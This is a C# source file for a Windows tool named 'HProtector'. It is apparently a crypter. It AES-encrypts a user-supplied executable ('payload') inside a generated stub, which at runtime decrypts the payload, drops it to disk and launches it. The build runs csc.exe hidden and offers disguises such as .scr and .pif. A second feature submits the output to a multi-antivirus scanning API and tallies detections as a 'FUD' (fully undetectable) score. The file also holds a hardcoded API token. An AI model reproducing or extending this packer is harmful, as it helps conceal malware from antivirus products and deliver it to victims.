using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Http;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Threading;
using System.Diagnostics;

namespace HProtector
{
    public partial class mainForm : Form
    {
        public mainForm()
        {
            InitializeComponent();
        }

        private void browsebutton_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.DefaultExt = "exe";
            dialog.Filter = "실행파일 (*.exe)|*.exe";
            dialog.FilterIndex = 1;
            dialog.InitialDirectory = @".";
            dialog.Title = "Browse Payload";
            if (dialog.ShowDialog() == DialogResult.OK)
            {
				GetPayloadType(dialog.FileName);
			}
        }

        private void filepathtextbox_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
                return;
            }
            e.Effect = DragDropEffects.None;
        }

        private void filepathtextbox_DragDrop(object sender, DragEventArgs e)
        {
            string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
            GetPayloadType(array[0]);
        }
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool GetBinaryTypeA(string lpApplicationName, out mainForm.BinaryType lpBinaryType);
		private void GetPayloadType(string path)
        {
            long length = new FileInfo(path).Length;
            if (length > 20971520L && MessageBox.Show("Over 20MB File can be unstable.\r\nDo you want to proceed?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No)
            {
                return;
            }
            bool flag = false;
            bool flag2 = true;
            mainForm.BinaryType binaryType;
			if (!mainForm.GetBinaryTypeA(path, out binaryType))
			{
				MessageBox.Show("Not valid PE type.", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (binaryType == mainForm.BinaryType.SCS_32BIT_BINARY)
			{
				try
				{
					AssemblyName.GetAssemblyName(path);
					flag2 = false;
					goto PASS;
				}
				catch
				{
					this.filepathtextbox.Text = path;
					flag2 = true;
					goto PASS;
				}
			}
			if (binaryType == mainForm.BinaryType.SCS_64BIT_BINARY)
			{
				MessageBox.Show("Not supported PE type.\r\nPE Type: x64", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (binaryType == mainForm.BinaryType.SCS_DOS_BINARY)
			{
				MessageBox.Show("Not supported PE type.\r\nPE Type: DOS", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (binaryType == mainForm.BinaryType.SCS_OS216_BINARY)
			{
				MessageBox.Show("Not supported PE type.\r\nPE Type: OS216", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (binaryType == mainForm.BinaryType.SCS_PIF_BINARY)
			{
				MessageBox.Show("Not supported PE type.\r\nPE Type: PIF", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (binaryType == mainForm.BinaryType.SCS_POSIX_BINARY)
			{
				MessageBox.Show("Not supported PE type.\r\nPE Type: POSIX", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (binaryType == mainForm.BinaryType.SCS_WOW_BINARY)
			{
				MessageBox.Show("Not supported PE type.\r\nPE Type: WOW", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				MessageBox.Show("Not valid PE type.", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		PASS:
			try
			{
				FileStream fileStream = File.Open(path, FileMode.Open);
				BinaryReader binaryReader = new BinaryReader(fileStream, Encoding.UTF8);
				byte[] array = binaryReader.ReadBytes((int)length);
				if (array[array.Length - 1] != 0)
				{
					flag = true;
				}
				fileStream.Close();
				binaryReader.Close();
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception occured\r\n" + ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (flag)
			{
				if (!flag2)
				{
					if (MessageBox.Show(".NET Preserve EOF not supported.\r\rHighly recommend to don't use protector.\r\nDo you want to proceed without preserve EOF?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
					{
						return;
					}
					this.filepathtextbox.Text = path;
					this.petypelabel.Text = "PE Type : .NET";
				}
				else
				{
					this.filepathtextbox.Text = path;
					this.petypelabel.Text = "PE Type : Native";
				}
			}
			else if (!flag2)
			{
				this.filepathtextbox.Text = path;
				this.petypelabel.Text = "PE Type : .NET";
			}
			else
			{
				this.petypelabel.Text = "PE Type : Native";
			}
			if ((double)length >= 1073741824.0)
			{
				this.pesizelabel.Text = "PE Size : " + string.Format("{0:##.##}", (double)length / 1073741824.0) + " GB";
				return;
			}
			if ((double)length >= 1048576.0)
			{
				this.pesizelabel.Text = "PE Size : " + string.Format("{0:##.##}", (double)length / 1048576.0) + " MB";
				return;
			}
			if ((double)length >= 1024.0)
			{
				this.pesizelabel.Text = "PE Size : " + string.Format("{0:##.##}", (double)length / 1024.0) + " KB";
				return;
			}
			if (length > 0L && (double)length < 1024.0)
			{
				this.pesizelabel.Text = "PE Size : " + length.ToString() + " Bytes";
			}
		}

        public enum BinaryType : uint
        {
            SCS_32BIT_BINARY,
            SCS_64BIT_BINARY = 6U,
            SCS_DOS_BINARY = 1U,
            SCS_OS216_BINARY = 5U,
            SCS_PIF_BINARY = 3U,
            SCS_POSIX_BINARY,
            SCS_WOW_BINARY = 2U
        }

        private void randomencryptkey_Click(object sender, EventArgs e)
        {
			encryptionkeytextbox.Text = Engine.GenerateRandomString(32);
        }

        private void avbrowse_Click(object sender, EventArgs e)
        {
			OpenFileDialog dialog = new OpenFileDialog();
			dialog.DefaultExt = "exe";
			dialog.Filter = "실행파일 (*.exe)|*.exe";
			dialog.FilterIndex = 1;
			dialog.InitialDirectory = @".";
			dialog.Title = "Browse Payload";
			if (dialog.ShowDialog() == DialogResult.OK)
			{
				avpath.Text = dialog.FileName;
			}
		}
		int[] avnum;
		string scantoken;
		string token = "7af44ea84702b2eb4ab2b2c478eb8c65af411ae0f1da1c74209b36e005ebcd34";
		private async void avscan_Click(object sender, EventArgs e)
        {
			int[] avnum = { 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2 };
			fudnumlabel.Text = "0 / 19";
			avprogressbar.Minimum = 0;
			avprogressbar.Maximum = 100;
			avprogressbar.Value = 0;
			avscan.Enabled = false;
			avbrowse.Enabled = false;
			fud = new int[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
			for (int i = 2; i < 21; i++)
			{
				this.avpanel.Controls["label" + i].ForeColor = Color.FromArgb(124, 133, 142);
				this.avpanel.Controls["label" + i].Text = "Scanning...";
			}
			using (var httpClient = new HttpClient())
			{
				using (var request = new HttpRequestMessage(new HttpMethod("POST"), "https://kleenscan.com/api/v1/file/scan"))
				{
					var multipartContent = new MultipartFormDataContent {
	  {
		new ByteArrayContent(File.ReadAllBytes(avpath.Text)),
		"path",
		Path.GetFileName(avpath.Text)
	  },
	  {
		new StringContent("adaware,avast,avg,avira,bitdefender,clamav,comodo,drweb,emsisoft,nod32,fsecure,ikarus,kaspersky,mcafee,sophos,trendmicro,microsoftdefender,zonealarm,zillya"),
		"avList"
	  }
	};
					request.Content = multipartContent;
					request.Headers.Add("X-Auth-Token", token);
					var response = await httpClient.SendAsync(request);
					string resp = JsonConvert.DeserializeObject(response.Content.ReadAsStringAsync().Result).ToString();
					//여기서부터 다시
					JObject obj = JObject.Parse(resp);
				    scantoken = obj["data"]["scan_token"].ToString();
					//end
					
					for(int j = 1; j < 21; j++)
                    {
						Thread thread = new Thread(() => resultrefresh(j));
						thread.Start();
						Delay(1500);
						avprogressbar.Value = j*5;
                    }
					avscan.Enabled = true;
					avbrowse.Enabled = true;
				}
			}
		}
		int[] fud = new int[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		int temp = 0;
		
		public async void resultrefresh(int num)
        {
			int[] avnum = new int[] { 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2 };
			CheckForIllegalCrossThreadCalls = false;
			string url = "https://kleenscan.com/api/v1/file/result/" + scantoken;
			HttpClient hc1;
			hc1 = new HttpClient();
			hc1.DefaultRequestHeaders.Add("X-Auth-Token", token);
			var response1 = await hc1.GetAsync(url);
			response1.EnsureSuccessStatusCode();
			string json = await response1.Content.ReadAsStringAsync();
			JObject obj1 = JObject.Parse(json);
			JArray array1 = JArray.Parse(obj1["data"].ToString());
			foreach (JObject itemObj1 in array1)
			{
				this.avpanel.Controls["label" + avnum[num - 1]].Text = itemObj1["flagname"].ToString();
				if(this.avpanel.Controls["label" + avnum[num - 1]].Text == "Undetected" || this.avpanel.Controls["label" + avnum[num - 1]].Text == "Scanning..." || this.avpanel.Controls["label" + avnum[num - 1]].Text == "Scanning results incomplete")
                {
					this.avpanel.Controls["label" + avnum[num - 1]].ForeColor = Color.FromArgb(124, 133, 142);
					
				}
                else
                {
					temp = 0;
					this.avpanel.Controls["label" + avnum[num - 1]].ForeColor = Color.Red;
					fud[avnum[num - 1] - 2] = 1;
					for (int i = 0; i < 19; i++)
                    {
						temp += fud[i];
                    }
						fudnumlabel.Text = temp.ToString() + " / 19";
				}
				avnum[num - 1]++;
			}
		}
		private static DateTime Delay(int MS)
		{
			// Thread 와 Timer보다 효율 적으로 사용할 수 있음.
			DateTime ThisMoment = DateTime.Now;
			TimeSpan duration = new TimeSpan(0, 0, 0, 0, MS);
			DateTime AfterWards = ThisMoment.Add(duration);

			while (AfterWards >= ThisMoment)
			{
				System.Windows.Forms.Application.DoEvents();
				ThisMoment = DateTime.Now;
			}
			return DateTime.Now;
		}
		private void xylosButton4_Click(object sender, EventArgs e)
        {
			for (int i = 2; i < 21; i++)
			{
				this.avpanel.Controls["label" + i].Text = i.ToString();
			}
		}
		//int avnum = 2;
        private void avscanrefresh_Click(object sender, EventArgs e)
        {
			//resultrefresh();
		}

		public void logg(string log)
		{
			logbox.Text += log + Environment.NewLine;
		}
		string result;
		private void protectbutton_Click(object sender, EventArgs e)
        {
			if (filepathtextbox.Text == "")
			{
				logg("Error! Select File");
			}
			else
			{
				
				SaveFileDialog sfd = new SaveFileDialog();
				sfd.Filter = "Win32 Executable|*.exe|Win32 Executable|*.scr|Win32 Executable|*.com|Win32 Executable|*.bat|Win32 Executable|*.cmd|Win32 Executable|*.pif";
				sfd.Title = "Protected file path";
				sfd.FileName = "Output.exe";
				sfd.OverwritePrompt = true;
				if (sfd.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				logg("Encoding...");
				if (!string.IsNullOrEmpty(filepathtextbox.Text))
				{
					FileStream fs = new FileStream(filepathtextbox.Text, FileMode.Open, FileAccess.Read);
					byte[] filebytes = new byte[fs.Length];
					fs.Read(filebytes, 0, Convert.ToInt32(fs.Length));
					string encodedData = Convert.ToBase64String(filebytes);
					result = encodedData;
				}
				logg("Encrypting...");
				byte[] Key = new byte[] { 15, 39, 66, 177, 202, 228, 129, 251, 161, 154, 168, 12, 101, 89, 79, 115, 118, 196, 120, 45, 191, 162, 107, 18, 171, 122, 226, 147, 186, 213, 90, 247 };
				byte[] IV = new byte[] { 244, 114, 165, 64, 71, 106, 81, 50, 246, 136, 41, 125, 239, 225, 52, 143 };
				string stubresult = Utils.GetEncryptedData(result, Key, IV);
				string stub = "using System.Diagnostics; using System; using System.Collections.Generic; using System.Linq; using System.Threading.Tasks; using System.Windows.Forms; using System.Security.Cryptography; using System.IO; using System.Reflection; using System.Threading; namespace Stub {    internal static class Program    {        static void Main()        {            string Payload = \"";
				stub += stubresult;
				stub += "\";            byte[] Key = new byte[] { 15, 39, 66, 177, 202, 228, 129, 251, 161, 154, 168, 12, 101, 89, 79, 115, 118, 196, 120, 45, 191, 162, 107, 18, 171, 122, 226, 147, 186, 213, 90, 247 };            byte[] IV = new byte[] { 244, 114, 165, 64, 71, 106, 81, 50, 246, 136, 41, 125, 239, 225, 52, 143 };            Thread.Sleep(1000);            File.WriteAllBytes(\".\\test1234.exe\", Convert.FromBase64String(GetDecryptedData(Payload, Key, IV)));            Process.Start(\".\\test1234.exe\");        }        static private byte[] HexStringToBytes(string hexData)        {            if (hexData == null)            {                return null;            }            List<byte> tempList = new List<byte>();            for (int i = 0; i < hexData.Length / 2; i++)            {                string hexValue = hexData.Substring(i * 2, 2);                tempList.Add(Convert.ToByte(hexValue, 16));            }            return tempList.ToArray();        }        static public string GetDecryptedData(string encStr, byte[] Key, byte[] IV)        {            byte[] encData2 = HexStringToBytes(encStr);            string data = DecryptStringFromBytes(encData2, Key, IV);            return data;        }        static string DecryptStringFromBytes(byte[] cipherText, byte[] Key, byte[] IV)        {            string plaintext = null;            using (RijndaelManaged rijAlg = new RijndaelManaged())            {                rijAlg.Key = Key;                rijAlg.IV = IV;                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);                using (MemoryStream msDecrypt = new MemoryStream(cipherText))                {                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))                    {                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))                        {                            plaintext = srDecrypt.ReadToEnd();                        }                    }                }            }            return plaintext;        }    }}";
				File.WriteAllText("test.cs", stub, Encoding.Default);
				logg("Compiling...");
				ProcessStartInfo pri = new ProcessStartInfo();
				Process pro = new Process();
				pri.FileName = "cmd.exe";
				pri.CreateNoWindow = true; //flase가 띄우기, true가 안 띄우기
				pri.UseShellExecute = false;
				pri.RedirectStandardInput = true;
				pri.RedirectStandardOutput = true;
				pri.RedirectStandardError = true;
				pro.StartInfo = pri;
				pro.Start();
				pro.StandardInput.Write(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:" + "\"" + sfd.FileName + "\"" + " /platform:x64 " + "\"test.cs\" " + "/win32icon:\"" + @"C:\Users\SeungHyuk\Desktop\download.ico" + Environment.NewLine);
				pro.StandardInput.Close();
				//log.Text = pro.StandardOutput.ReadToEnd();
				//logg(pro.StandardOutput.ReadToEnd());
				pro.WaitForExit();
				pro.Close();
				//if (pumped.Checked == true)
				//{
				//	Pump(pumping, sfd.FileName);
				//}
				logg("Protection success");
			}
		}

        private void stubbrowsebutton_Click(object sender, EventArgs e)
        {
			OpenFileDialog dialog = new OpenFileDialog();
			dialog.DefaultExt = "hstub";
			dialog.Filter = "Stub File (*.hstub)|*.hstub";
			dialog.FilterIndex = 1;
			dialog.InitialDirectory = @".";
			dialog.Title = "Browse Stub";
			if (dialog.ShowDialog() == DialogResult.OK)
			{
				stubpathtextbox.Text = dialog.FileName;
			}
		}
    }
}
